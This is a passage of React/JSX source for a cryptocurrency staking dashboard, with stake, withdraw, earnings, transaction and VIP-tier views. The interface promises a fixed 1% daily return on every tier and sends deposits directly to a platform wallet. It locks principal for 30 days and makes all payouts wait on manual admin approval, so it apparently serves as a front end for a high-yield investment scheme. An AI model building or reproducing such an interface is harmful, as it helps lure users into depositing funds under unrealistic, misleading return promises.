                        <div className="token-card-bar-wrap">
                          <div className="token-card-bar" style={{width:`${Math.min(pct,100)}%`,background:c.bar}}/>
                          <span className="token-card-pct">{pct}%</span>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Bitcoin address input */}
                <div className="btc-address-card">
                  <div className="btc-address-header">
                    <div className="btc-address-icon">₿</div>
                    <div>
                      <div className="btc-address-title">Bitcoin Address</div>
                      <div className="btc-address-sub">Link your BTC address to track native Bitcoin balance</div>
                    </div>
                  </div>
                  <div className="btc-address-row">
                    <input
                      type="text"
                      className="btc-address-input"
                      placeholder="1..., 3..., or bc1... address"
                      value={btcAddressInput}
                      onChange={e => setBtcAddressInput(e.target.value)}
                    />
                    <button
                      className="btc-address-btn"
                      onClick={saveBtcAddress}
                      disabled={btcSaving || !btcAddressInput.trim()}
                    >
                      {btcSaving ? 'Saving…' : 'Save'}
                    </button>
                  </div>
                  {btcAddress && (
                    <div className="btc-address-saved">
                      <span>✓</span> Saved: <code>{btcAddress.slice(0,14)}…{btcAddress.slice(-6)}</code>
                    </div>
                  )}
                </div>
              </div>

              <div className="quick-actions">
                <h2 className="section-title">Quick Actions</h2>
                <div className="actions-grid">
                  <button className="action-btn primary" onClick={() => { setActiveTab('stake'); fetchStakeableTokens(); }}>
                    <span className="action-icon">💎</span>
                    <span>Stake</span>
                  </button>
                  <button className="action-btn secondary" onClick={() => setActiveTab('withdraw')}>
                    <span className="action-icon">💸</span>
                    <span>Withdraw</span>
                  </button>
                  <button
                    className="action-btn success"
                    onClick={handleClaimRewards}
                    disabled={loading || userData.claimableRewards <= 0 || claimPending}
                  >
                    <span className="action-icon">🎁</span>
                    <span>{claimPending ? 'Claim Pending' : `Claim ${formatNumber(userData.claimableRewards)}`}</span>
                  </button>
                  <button className="action-btn" style={{background:'rgba(167,139,250,0.1)',border:'1px solid rgba(167,139,250,0.25)',color:'#a78bfa'}} onClick={() => setActiveTab('vip')}>
                    <span className="action-icon">⭐</span>
                    <span>VIP {getVipName(userData.vipLevel)}</span>
                  </button>
                </div>
              </div>

              {/* Info cards */}
              <div className="info-cards-grid">
                <div className="info-card">
                  <h3>📈 Daily Rate</h3>
                  <div className="info-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDC</div>
                  <p>1% of staked per day</p>
                </div>
                <div className="info-card">
                  <h3>📅 This Month</h3>
                  <div className="info-value">{(parseFloat(getDailyEarnings()) * 30).toFixed(2)} USDC</div>
                  <p>30-day projection</p>
                </div>
                <div className="info-card">
                  <h3>🏦 Principal Lock</h3>
                  <div className="info-value" style={{color:'#fbbf24',fontSize:'1rem'}}>30-Day Lock</div>
                  <p>Staked funds locked 30 days; earnings withdrawable anytime</p>
                </div>
              </div>

              {/* Recent activity */}
              <div className="recent-transactions">
                <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:'1rem'}}>
                  <h2 className="section-title" style={{margin:0}}>Recent Activity</h2>
                  <button className="refresh-btn" onClick={() => { fetchTransactions(); fetchUserData(); }}>Refresh</button>
                </div>
                <div className="transactions-list">
                  {transactions.length > 0 ? transactions.slice(0, 6).map((tx, i) => {
                    const icons = { stake:'💎', unstake:'📤', claim:'🎁', withdraw:'💸', withdraw_earnings:'💰' };
                    const labels = { stake:'Staked', unstake:'Unstaked', claim:'Claim Request', withdraw:'Withdrawal', withdraw_earnings:'Earnings Withdrawal' };
                    return (
                      <div key={tx.id||i} className="transaction-item">
                        <div className="tx-icon-wrapper">{icons[tx.type]||'📋'}</div>
                        <div className="tx-info">
                          <div className="tx-type">{labels[tx.type]||tx.type}</div>
                          <div className="tx-date">{tx.date} · <span style={{color: tx.status==='completed'?'#10b981':tx.status==='pending'?'#fbbf24':'#f87171'}}>{tx.status}</span></div>
                          {tx.txHash && <a href={`https://etherscan.io/tx/${tx.txHash}`} target="_blank" rel="noopener noreferrer" className="tx-hash-link">{tx.txHash.slice(0,8)}… ↗</a>}
                        </div>
                        <div className="tx-amount" style={{color: tx.type==='stake'?'#a78bfa':tx.type==='claim'||tx.type==='withdraw_earnings'?'#10b981':'#fbbf24'}}>
                          {tx.type==='stake'?'+':'-'}{formatNumber(tx.amount)} USDC
                        </div>
                      </div>
                    );
                  }) : (
                    <div className="no-transactions"><p>No transactions yet. Stake some USDC to get started!</p></div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              STAKE TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'stake' && (
            <div className="stake-section">
              <div className="stake-grid">
                <div className="stake-panel">
                  <div style={{display:'flex',alignItems:'center',gap:'8px',marginBottom:'14px'}}>
                    <h2 className="panel-title" style={{margin:0}}>Stake Tokens</h2>
                    <span style={{fontSize:'0.72rem',fontWeight:700,padding:'3px 10px',borderRadius:'20px',background: network==='BSC'?'#f0b90b': network==='ETH'?'#627eea': network==='TRX'?'#ef4444':'#f7931a',color: network==='ETH'?'#fff':'#000'}}>
                      {network}
                    </span>
                  </div>

                  {/* EVM networks (BSC / ETH) — automatic MetaMask transfer */}
                  {(network === 'BSC' || network === 'ETH') && (<>
                    <div style={{background:'rgba(16,185,129,0.08)',border:'1px solid rgba(16,185,129,0.2)',borderRadius:'10px',padding:'10px 14px',marginBottom:'14px',fontSize:'0.8rem',color:'#94a3b8'}}>
                      ✅ Your wallet will auto-switch to the correct chain and send <strong style={{color:'#e2e8f0'}}>{selectedToken}</strong> directly to the platform wallet.
                    </div>

                    {/* Token selector — live balances from backend */}
                    <div style={{marginBottom:'14px'}}>
                      <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:'6px'}}>
                        <div style={{fontSize:'0.8rem',color:'#94a3b8',fontWeight:600}}>Select Token to Stake</div>
                        <button onClick={fetchStakeableTokens} disabled={loadingStakeTokens || loading} style={{fontSize:'0.72rem',background:'rgba(99,102,241,0.15)',border:'1px solid rgba(99,102,241,0.3)',color:'#a5b4fc',padding:'2px 10px',borderRadius:'20px',cursor:'pointer'}}>
                          {loadingStakeTokens ? 'Loading…' : '↻ Refresh'}
                        </button>
                      </div>
                      {loadingStakeTokens ? (
                        <div style={{fontSize:'0.82rem',color:'#94a3b8',padding:'10px',textAlign:'center'}}>Scanning wallet…</div>
                      ) : stakeableTokens.length === 0 ? (
                        <div style={{fontSize:'0.82rem',color:'#f87171',padding:'10px',background:'rgba(239,68,68,0.08)',borderRadius:'8px',border:'1px solid rgba(239,68,68,0.2)'}}>
                          No token balances found. Click ↻ Refresh or make sure your wallet is connected.
                        </div>
                      ) : (
                        <select
                          value={`${selectedToken}:${selectedTokenChain}`}
                          onChange={e => {
                            const [sym, ch] = e.target.value.split(':');
                            setSelectedToken(sym);
                            setSelectedTokenChain(ch);
                            setStakeAmount('');
                          }}
                          style={{width:'100%',padding:'0.7rem 1rem',background:'rgba(255,255,255,0.06)',border:'1px solid rgba(255,255,255,0.15)',borderRadius:'10px',color:'#fff',fontSize:'0.88rem',cursor:'pointer'}}
                          disabled={loading}
                        >
                          {stakeableTokens.map(t => (
                            <option key={`${t.symbol}:${t.chain}`} value={`${t.symbol}:${t.chain}`} style={{background:'#1a1a2e'}}>
                              {t.symbol} ({t.chain === 'bsc' ? 'BSC' : 'ETH'}) — Balance: {parseFloat(t.balance).toFixed(6)}
                            </option>
                          ))}
                        </select>
                      )}
                    </div>

                    {/* Balance + staking inputs */}
                    {(() => {
                      const tok = stakeableTokens.find(t => t.symbol === selectedToken && t.chain === selectedTokenChain);
                      const bal = tok ? parseFloat(tok.balance) : 0;
                      return (<>
                        <div className="balance-display">
                          <span>Wallet {selectedToken} Balance ({selectedTokenChain === 'bsc' ? 'BSC' : 'ETH'})</span>
                          <span className="balance-value">{bal.toFixed(6)} {selectedToken}</span>
                        </div>
                        <div className="balance-display" style={{marginTop:'8px',opacity:0.7}}>
                          <span>Already Staked</span>
                          <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDC</span>
                        </div>
                        <div className="input-group">
                          <input type="number" placeholder="Enter amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} className="stake-input" disabled={loading} />
                          <button className="max-btn" onClick={() => setStakeAmount(bal.toFixed(6))} disabled={loading}>MAX</button>
                        </div>
                      </>);
                    })()}
                    <div className="quick-amounts">
                      {['100','500','1000','5000'].map(v => <button key={v} onClick={() => setStakeAmount(v)} disabled={loading}>{parseInt(v).toLocaleString()}</button>)}
                    </div>
                    <div className="stake-info">
                      <div className="info-row"><span>Current APY</span><span className="info-value">{getCurrentAPY()}% Annual</span></div>
                      <div className="info-row"><span>Est. Daily Earnings</span><span className="info-value">{stakeAmount ? ((parseFloat(stakeAmount) * (parseFloat(getCurrentAPY()) / 100)) / 365).toFixed(4) : '0.00'} {selectedToken}</span></div>
                    </div>
                    <button className="stake-btn primary" onClick={handleStake} disabled={loading || !stakeAmount}>
                      {loading ? 'Processing...' : `Stake ${selectedToken} on ${selectedTokenChain === 'bsc' ? 'BSC' : 'ETH'}`}
                    </button>
                  </>)}

                  {/* Manual networks (TRX / BTC) — user sends manually, submits tx hash */}
                  {(network === 'TRX' || network === 'BTC') && (<>
                    <div style={{background:'rgba(239,68,68,0.08)',border:'1px solid rgba(239,68,68,0.2)',borderRadius:'10px',padding:'12px 14px',marginBottom:'14px',fontSize:'0.82rem',color:'#94a3b8'}}>
                      <strong style={{color:'#f87171',display:'block',marginBottom:'4px'}}>Manual Deposit — {network === 'TRX' ? 'TRC-20 USDC' : 'Native BTC'}</strong>
                      Send {network === 'TRX' ? 'USDT (TRC-20)' : 'BTC'} to the address below, then paste your transaction ID to submit for review.
                    </div>

                    {/* Platform deposit address */}
                    <DepositAddress network={network} apiBase={API_BASE} />

                    <div style={{marginTop:'16px',marginBottom:'8px',fontSize:'0.82rem',color:'#94a3b8',fontWeight:600}}>Amount Sent ({network === 'TRX' ? 'USDT' : 'BTC'})</div>
                    <div className="input-group">
                      <input type="number" placeholder={`Amount you sent (e.g. 100)`} value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} className="stake-input" disabled={manualDepositLoading} />
                    </div>

                    <div style={{marginTop:'12px',marginBottom:'8px',fontSize:'0.82rem',color:'#94a3b8',fontWeight:600}}>Transaction Hash / ID</div>
                    <input
                      type="text"
                      placeholder={network === 'TRX' ? 'Paste TRX transaction ID...' : 'Paste BTC transaction ID...'}
                      value={manualTxHash}
                      onChange={(e) => setManualTxHash(e.target.value)}
                      style={{width:'100%',padding:'0.75rem 1rem',background:'rgba(255,255,255,0.06)',border:'1px solid rgba(255,255,255,0.12)',borderRadius:'10px',color:'#fff',fontSize:'0.82rem',fontFamily:'monospace',boxSizing:'border-box',marginBottom:'16px'}}
                      disabled={manualDepositLoading}
                    />
                    <button className="stake-btn primary" onClick={handleManualDeposit} disabled={manualDepositLoading || !stakeAmount || !manualTxHash.trim()}>
                      {manualDepositLoading ? 'Submitting...' : 'Submit Deposit for Review'}
                    </button>
                    <p style={{fontSize:'0.75rem',color:'#64748b',marginTop:'10px',textAlign:'center'}}>Admin will verify your transaction and credit your staked balance within minutes.</p>
                  </>)}
                </div>

                <div className="stake-panel">
                  <h2 className="panel-title">Your Staked Balance</h2>
                  <div className="balance-display">
                    <span>Currently Staked</span>
                    <span className="balance-value">{formatNumber(userData.stakedAmount)} USDC</span>
                  </div>
                  <div className="stake-info">
                    <div className="info-row">
                      <span>VIP Level</span>
                      <span className="info-value">VIP {userData.vipLevel}</span>
                    </div>
                    <div className="info-row">
                      <span>Current APY</span>
                      <span className="info-value">{getCurrentAPY()}% Annual</span>
                    </div>
                    <div className="info-row">
                      <span>Daily Earnings</span>
                      <span className="info-value">{getDailyEarnings()} USDC</span>
                    </div>
                  </div>
                  <div className="warning-box">
                    To withdraw staked USDC, use the Withdraw tab. Withdrawals require admin approval.
                  </div>
                  <button
                    className="stake-btn secondary"
                    onClick={() => setActiveTab('withdraw')}
                  >
                    Go to Withdraw
                  </button>
                </div>
              </div>

              <div className="claim-panel">
                <div className="claim-header">
                  <div>
                    <h2 className="panel-title">Claimable Rewards</h2>
                    <p className="claim-subtitle">Your accumulated earnings ready to claim</p>
                  </div>
                  <div className="claim-amount">{formatNumber(userData.claimableRewards)} USDC</div>
                </div>
                <button
                  className="stake-btn success"
                  onClick={handleClaimRewards}
                  disabled={loading || userData.claimableRewards <= 0}
                >
                  {loading ? 'Processing...' : 'Claim Rewards'}
                </button>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              WITHDRAW TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'withdraw' && (
            <div className="withdraw-section">

              {/* Payout address info */}
              <div className="lock-info-banner" style={{marginBottom:'1.25rem'}}>
                <div className="lock-icon">💳</div>
                <div className="lock-text">
                  <strong>Your payout wallet</strong>
                  Approved withdrawals are sent to: <code style={{fontFamily:'monospace',color:'#fbbf24'}}>{walletAddress.slice(0,12)}…{walletAddress.slice(-8)}</code>.
                  Make sure your wallet is still accessible.
                </div>
              </div>

              {/* Network + Token selector — applies to all withdrawal requests */}
              <div style={{background:'rgba(255,255,255,0.03)',border:'1px solid rgba(255,255,255,0.08)',borderRadius:'12px',padding:'1rem 1.25rem',marginBottom:'1.25rem',display:'flex',alignItems:'center',gap:'1.5rem',flexWrap:'wrap'}}>
                <div style={{display:'flex',alignItems:'center',gap:'0.75rem'}}>
                  <div style={{fontWeight:600,fontSize:'0.88rem',color:'rgba(255,255,255,0.7)',whiteSpace:'nowrap'}}>Receive on:</div>
                  <div style={{display:'flex',gap:'0.5rem'}}>
                    {['BSC','ETH'].map(net => (
                      <button key={net} onClick={() => setPayoutNetwork(net)}
                        style={{padding:'0.45rem 1.1rem',borderRadius:'8px',border:`1px solid ${payoutNetwork===net?'#667eea':'rgba(255,255,255,0.1)'}`,
                          background:payoutNetwork===net?'rgba(102,126,234,0.2)':'transparent',
                          color:payoutNetwork===net?'#a78bfa':'rgba(255,255,255,0.5)',fontWeight:700,fontSize:'0.82rem',cursor:'pointer'}}>
                        {net==='BSC'?'BSC (BNB Chain)':'ETH (Ethereum)'}
                      </button>
                    ))}
                  </div>
                </div>
                <div style={{display:'flex',alignItems:'center',gap:'0.75rem'}}>
                  <div style={{fontWeight:600,fontSize:'0.88rem',color:'rgba(255,255,255,0.7)',whiteSpace:'nowrap'}}>Payout:</div>
                  <div style={{padding:'0.45rem 1.1rem',borderRadius:'8px',border:'1px solid rgba(16,185,129,0.4)',background:'rgba(16,185,129,0.12)',color:'#34d399',fontWeight:700,fontSize:'0.82rem'}}>USDC</div>
                </div>
                <div style={{fontSize:'0.75rem',color:'rgba(255,255,255,0.35)',marginLeft:'auto'}}>
                  {payoutNetwork==='BSC'?'Low fees · Fast':'Higher fees · Ethereum mainnet'}
                </div>
              </div>

              {/* Claim rewards panel */}
              <div className="earnings-withdraw-panel">
                <div className="stake-panel earnings-panel-highlight">
                  <h2 className="panel-title">Claim Rewards</h2>
                  <p className="panel-subtitle">Request a payout of your accumulated daily earnings</p>
                  <div className="balance-display">
                    <span>Claimable Rewards</span>
                    <span className="balance-value" style={{color:'#10b981'}}>{formatNumber(userData.claimableRewards)} USDC</span>
                  </div>
                  {claimPending && (
                    <div style={{borderRadius:'10px',padding:'14px 16px',marginBottom:'12px',background:'rgba(102,126,234,0.08)',border:'1px solid rgba(102,126,234,0.35)'}}>
                      <div style={{fontWeight:700,color:'#a78bfa',marginBottom:'6px',fontSize:'0.88rem'}}>
                        ⏳ Your claim is being processed
                      </div>
                      {claimTimeLeft === 'overdue' ? (
                        <div style={{fontSize:'0.82rem',color:'rgba(255,255,255,0.55)'}}>
                          Processing is taking a little longer than expected — admin will send your {payoutToken} shortly.
                        </div>
                      ) : claimTimeLeft ? (
                        <>
                          <div style={{fontSize:'0.82rem',color:'rgba(255,255,255,0.55)',marginBottom:'10px'}}>
                            Expected within 24 hours of your request.
                          </div>
                          <div style={{display:'flex',alignItems:'center',gap:'10px'}}>
                            <div style={{flex:1,height:'6px',borderRadius:'3px',background:'rgba(255,255,255,0.08)',overflow:'hidden'}}>
                              <div style={{
                                height:'100%',
                                borderRadius:'3px',
                                background:'linear-gradient(90deg,#667eea,#a78bfa)',
                                width:`${Math.min(100, 100 - ((() => { const diff = new Date(pendingClaim.requestedAt).getTime() + 86400000 - Date.now(); return Math.max(0, diff / 86400000 * 100); })()))}%`,
                                transition:'width 1s linear'
                              }}/>
                            </div>
                            <span style={{fontSize:'0.82rem',fontWeight:700,color:'#a78bfa',whiteSpace:'nowrap'}}>
                              ~{claimTimeLeft} left
                            </span>
                          </div>
                        </>
                      ) : (
                        <div style={{fontSize:'0.82rem',color:'rgba(255,255,255,0.55)'}}>
                          Expected within 24 hours — admin will send {payoutToken} to your wallet once approved.
                        </div>
                      )}
                    </div>
                  )}
                  {!claimPending && (
                    <div className="stake-info">
                      <div className="info-row"><span>Amount</span><span className="info-value">{formatNumber(userData.claimableRewards)} USDC</span></div>
                      <div className="info-row"><span>Token</span><span className="info-value">{payoutToken}</span></div>
                      <div className="info-row"><span>Fee</span><span className="info-value">0%</span></div>
                      <div className="info-row"><span>You receive</span><span className="info-value" style={{color:'#10b981'}}>{formatNumber(userData.claimableRewards)} {payoutToken}</span></div>
                    </div>
                  )}
                  <div className="warning-box">
                    Admin sends {payoutToken} from the platform wallet to your address after approving. You'll see the transaction hash in your history.
                  </div>
                  <button className="stake-btn success" onClick={handleClaimRewards}
                    disabled={loading || userData.claimableRewards <= 0 || claimPending}>
                    {loading ? 'Submitting…' : claimPending ? '⏳ Claim Pending Approval' : `Claim ${formatNumber(userData.claimableRewards)} ${payoutToken}`}
                  </button>
                </div>
              </div>

              <div className="withdraw-grid">
                {/* Principal withdrawal */}
                <div className="stake-panel">
                  <h2 className="panel-title">Withdraw Principal</h2>

                  {userData.principalLocked ? (
                    /* ── LOCKED STATE ── */
                    <>
                      <div style={{background:'rgba(239,68,68,0.1)',border:'1px solid rgba(239,68,68,0.35)',borderRadius:'12px',padding:'1.25rem',marginBottom:'1.25rem',textAlign:'center'}}>
                        <div style={{fontSize:'2.5rem',marginBottom:'0.5rem'}}>🔒</div>
                        <div style={{fontWeight:700,color:'#ef4444',fontSize:'1rem',marginBottom:'0.4rem'}}>Principal Locked</div>
                        <div style={{fontSize:'0.82rem',color:'rgba(255,255,255,0.6)',lineHeight:1.5}}>
                          Your staked deposit cannot be withdrawn yet.<br/>
                          <span style={{color:'#fbbf24',fontWeight:700,fontSize:'1rem'}}>{userData.daysUntilUnlock} day{userData.daysUntilUnlock !== 1 ? 's' : ''}</span> remaining until unlock.
                        </div>
                      </div>
                      <div className="balance-display">
                        <span>Locked Balance</span>
                        <span className="balance-value" style={{color:'#ef4444'}}>{formatNumber(userData.stakedAmount)} USDC</span>
                      </div>
                      <div style={{background:'rgba(16,185,129,0.08)',border:'1px solid rgba(16,185,129,0.2)',borderRadius:'10px',padding:'0.875rem',marginTop:'0.75rem',fontSize:'0.8rem',color:'rgba(255,255,255,0.6)',lineHeight:1.5}}>
                        While locked, you can still <strong style={{color:'#10b981'}}>claim your daily earnings</strong> (rewards) at any time using the Claim Rewards panel.
                      </div>
                      <button className="stake-btn withdraw-btn" disabled style={{marginTop:'1rem',opacity:0.35,cursor:'not-allowed'}}>
                        🔒 Locked — {userData.daysUntilUnlock} days remaining
                      </button>
                    </>
                  ) : (
                    /* ── UNLOCKED STATE ── */
                    <>
                      <div className="lock-info-banner" style={{background:'rgba(16,185,129,0.08)',border:'1px solid rgba(16,185,129,0.2)'}}>
                        <div className="lock-icon">🔓</div>
                        <div className="lock-text" style={{color:'#10b981'}}>
                          <strong>Principal Unlocked</strong>
                          Your 30-day lock period has passed. You can now withdraw your staked deposit.
                        </div>
                      </div>
                      <div className="balance-display">
                        <span>Staked Balance</span>
                        <span className="balance-value">{formatNumber(userData.stakedAmount)} USDC</span>
                      </div>
                      {withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').length > 0 && (
                        <div className="warning-box">
                          ⏳ {withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').length} pending withdrawal(s) — {formatNumber(withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').reduce((s,w)=>s+w.amount,0))} USDC
                        </div>
                      )}
                      <div className="input-group">
                        <input type="number" placeholder="Amount to withdraw" value={withdrawAmount}
                          onChange={e=>setWithdrawAmount(e.target.value)} className="stake-input" disabled={loading} />
                        <button className="max-btn" disabled={loading} onClick={() => {
                          const p=withdrawals.filter(w=>w.status==='pending'&&w.withdrawalType!=='earnings'&&w.withdrawalType!=='claim').reduce((s,w)=>s+w.amount,0);
                          setWithdrawAmount(String(Math.max(0,userData.stakedAmount-p)));
                        }}>MAX</button>
                      </div>
                      <div className="quick-amounts">
                        {['100','500','1000','5000'].map(v=><button key={v} onClick={()=>setWithdrawAmount(v)} disabled={loading}>{parseInt(v).toLocaleString()}</button>)}
                      </div>
                      <div className="stake-info">
                        <div className="info-row"><span>Fee</span><span className="info-value">{getWithdrawalFee()}%</span></div>
                        <div className="info-row"><span>Fee amount</span><span className="info-value">{withdrawAmount?(parseFloat(withdrawAmount)*getWithdrawalFee()/100).toFixed(2):'0.00'} USDC</span></div>
                        <div className="info-row"><span>You receive</span><span className="info-value" style={{color:'#10b981'}}>{withdrawAmount?(parseFloat(withdrawAmount)*(1-getWithdrawalFee()/100)).toFixed(2):'0.00'} USDC</span></div>
                      </div>
                      <button className="stake-btn withdraw-btn" onClick={handleWithdraw} disabled={loading||!withdrawAmount}>
                        {loading?'Processing…':'Request Withdrawal'}
                      </button>
                    </>
                  )}
                </div>

                {/* Withdrawal history */}
                <div className="stake-panel">
                  <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:'1rem'}}>
                    <h2 className="panel-title" style={{margin:0}}>Withdrawal History</h2>
                    <button className="refresh-btn" onClick={fetchWithdrawals}>Refresh</button>
                  </div>
                  <div className="withdraw-history">
                    {withdrawals.length > 0 ? withdrawals.map((w,i) => {
                      const typeLabel = w.withdrawalType==='claim'?'Claim':w.withdrawalType==='earnings'?'Earnings':'Principal';
                      const typeClass = w.withdrawalType==='claim'?'claim':w.withdrawalType==='earnings'?'earnings':'withdraw';
                      return (
                        <div key={w.id||i} className="withdraw-item">
                          <div className="withdraw-item-header">
                            <div style={{display:'flex',alignItems:'center',gap:'0.5rem'}}>
                              <span className={`withdraw-status ${w.status}`}>
                                {w.status==='pending'?'⏳':w.status==='approved'?'✅':'❌'} {w.status}
                              </span>
                              <span className={`tx-badge ${typeClass}`}>{typeLabel}</span>
                            </div>
                            <span className="withdraw-date">{new Date(w.requestedAt).toLocaleDateString()}</span>
                          </div>
                          <div className="withdraw-item-details">
                            <div className="withdraw-detail-row"><span>Amount</span><span>{formatNumber(w.amount)} USDC</span></div>
                            <div className="withdraw-detail-row"><span>Fee</span><span>-{formatNumber(w.fee||0)} USDC</span></div>
                            <div className="withdraw-detail-row net"><span>You receive</span><span>{formatNumber(w.netAmount||w.amount)} USDC</span></div>
                          </div>
                          {w.txHash && <div style={{marginTop:'0.5rem',fontSize:'0.72rem',color:'#a78bfa',fontFamily:'monospace'}}>Tx: {w.txHash.slice(0,14)}…</div>}
                          {w.rejectionReason && <div className="withdraw-rejection">Reason: {w.rejectionReason}</div>}
                        </div>
                      );
                    }) : (
                      <div className="no-transactions"><p>No withdrawal requests yet</p></div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              EARNINGS TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'earnings' && (
            <div className="earnings-section">

              {/* Daily rate hero */}
              <div className="daily-rate-card">
                <div className="daily-rate-left">
                  <div className="daily-rate-label">Daily Earnings</div>
                  <div className="daily-rate-value">{getDailyEarnings()} USDC</div>
                  <div className="daily-rate-sub">Based on {formatNumber(userData.stakedAmount)} USDC staked</div>
                </div>
                <div className="daily-rate-badge">
                  <div className="badge-pct">1%</div>
                  <div className="badge-label">per day</div>
                </div>
              </div>

              {/* Summary cards */}
              <div className="earnings-summary">
                <div className="summary-card">
                  <h3>Today</h3>
                  <div className="summary-value" style={{color:'#10b981'}}>{getDailyEarnings()} USDC</div>
                  <div className="summary-subtitle">Daily earnings</div>
                </div>
                <div className="summary-card">
                  <h3>7 Days</h3>
                  <div className="summary-value">{(parseFloat(getDailyEarnings())*7).toFixed(2)} USDC</div>
                  <div className="summary-subtitle">Weekly projection</div>
                </div>
                <div className="summary-card">
                  <h3>30 Days</h3>
                  <div className="summary-value">{(parseFloat(getDailyEarnings())*30).toFixed(2)} USDC</div>
                  <div className="summary-subtitle">Monthly projection</div>
                </div>
                <div className="summary-card">
                  <h3>All Time</h3>
                  <div className="summary-value">{formatNumber(userData.totalEarned)} USDC</div>
                  <div className="summary-subtitle">Total earned</div>
                </div>
              </div>

              {/* Breakdown */}
              <div className="earnings-breakdown">
                <h2 className="section-title">Earnings Breakdown</h2>
                <div className="breakdown-list">
                  <div className="breakdown-item"><span>Daily Rate</span><span className="highlight">1% per day</span></div>
                  <div className="breakdown-item"><span>Staked Amount</span><span>{formatNumber(userData.stakedAmount)} USDC</span></div>
                  <div className="breakdown-item"><span>Daily Earnings</span><span style={{color:'#10b981',fontWeight:700}}>{getDailyEarnings()} USDC</span></div>
                  <div className="breakdown-item"><span>Claimable Now</span><span style={{color:'#34d399',fontWeight:700}}>{formatNumber(userData.claimableRewards)} USDC</span></div>
                  <div className="breakdown-item"><span>Total Earned (All Time)</span><span>{formatNumber(userData.totalEarned)} USDC</span></div>
                  <div className="breakdown-item"><span>VIP Level</span><span>{getVipName(userData.vipLevel)}</span></div>
                  <div className="breakdown-item"><span>Principal Lock</span><span style={{color:'#fbbf24'}}>30 days from stake date</span></div>
                </div>
                {userData.stakedAmount > 0 && (
                  <div style={{marginTop:'1.25rem',textAlign:'center'}}>
                    <button className="stake-btn success" style={{maxWidth:220}} onClick={handleClaimRewards}
                      disabled={loading||userData.claimableRewards<=0||claimPending}>
                      {claimPending?'⏳ Claim Pending':'Claim '+formatNumber(userData.claimableRewards)+' USDC'}
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              TRANSACTIONS TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'transactions' && (
            <div className="transactions-section">
              <div className="transactions-header">
                <h2 className="section-title">Transaction History</h2>
                <button className="refresh-btn" onClick={fetchTransactions}>↻ Refresh</button>
              </div>
              <div className="transactions-table">
                <div className="table-header">
                  <div className="table-cell">Type</div>
                  <div className="table-cell">Amount</div>
                  <div className="table-cell">Date</div>
                  <div className="table-cell">Status</div>
                  <div className="table-cell">Tx Hash</div>
                </div>
                {transactions.length > 0 ? transactions.map((tx,i) => {
                  const labels={stake:'Staked',unstake:'Unstaked',claim:'Claim Request',withdraw:'Withdrawal',withdraw_earnings:'Earn Withdrawal'};
                  const badgeClass=tx.type==='withdraw_earnings'?'withdraw_earnings':tx.type;
                  return (
                    <div key={tx.id||i} className="table-row">
                      <div className="table-cell"><span className={`tx-badge ${badgeClass}`}>{labels[tx.type]||tx.type}</span></div>
                      <div className="table-cell">{formatNumber(tx.amount)} USDC</div>
                      <div className="table-cell">{tx.date}</div>
                      <div className="table-cell"><span className={`status-badge ${tx.status}`}>{tx.status}</span></div>
                      <div className="table-cell">
                        {tx.txHash
                          ? <a href={`https://etherscan.io/tx/${tx.txHash}`} target="_blank" rel="noopener noreferrer" className="tx-hash-link">{tx.txHash.slice(0,8)}… ↗</a>
                          : <span className="tx-hash-none">—</span>}
                      </div>
                    </div>
                  );
                }) : (
                  <div className="no-transactions-full">
                    <p>No transactions yet</p>
                    <span>Stake USDC to start earning and see your history here</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              VIP TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'vip' && (
            <div className="vip-section-dash">
              <div className="current-vip">
                <div className="vip-card">
                  <div className="vip-icon-large">⭐</div>
                  <h2>{getVipName(userData.vipLevel)}</h2>
                  <div className="vip-apy">1% Daily · {(parseFloat(getDailyEarnings())*30).toFixed(2)} USDC/month</div>
                  <div className="vip-staked">Staked: {formatNumber(userData.stakedAmount)} USDC</div>
                </div>
              </div>

              <div className="vip-tiers">
                <h2 className="section-title">VIP Tiers</h2>
                <div className="tiers-list">
                  {[
                    {lvl:0,label:'Standard',range:'< 10,000 USDC',color:null},
                    {lvl:1,label:'VIP 1',range:'10,000 – 49,999 USDC',color:'#667eea'},
                    {lvl:2,label:'VIP 2',range:'50,000 – 99,999 USDC',color:'#a78bfa'},
                    {lvl:3,label:'VIP 3',range:'100,000+ USDC',color:'#fbbf24'},
                  ].map(tier => (
                    <div key={tier.lvl} className={`tier-item ${userData.vipLevel===tier.lvl?'active':''}`}>
                      <div className={`tier-badge-dash ${tier.lvl===3?'premium':''}`} style={tier.color?{color:tier.color}:{}}>{tier.label}</div>
                      <div className="tier-requirement">{tier.range}</div>
                      <div className="tier-apy-dash">1% / day</div>
                      <div className="tier-benefits">
                        <div>✓ 1% daily on staked amount</div>
                        <div>✓ Admin-managed staking</div>
                        {tier.lvl>=1&&<div>✓ Priority support</div>}
                        {tier.lvl>=2&&<div>✓ Dedicated account manager</div>}
                        {tier.lvl>=3&&<div>✓ Exclusive VIP events</div>}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {userData.vipLevel < 3 && (
                <div className="next-tier-progress">
                  <h3>Progress to {getVipName(userData.vipLevel + 1)}</h3>
                  <div className="progress-bar">
                    <div className="progress-fill" style={{width:`${Math.min(100,(userData.stakedAmount/[10000,50000,100000][userData.vipLevel])*100)}%`}} />
                  </div>
                  <div className="progress-info">
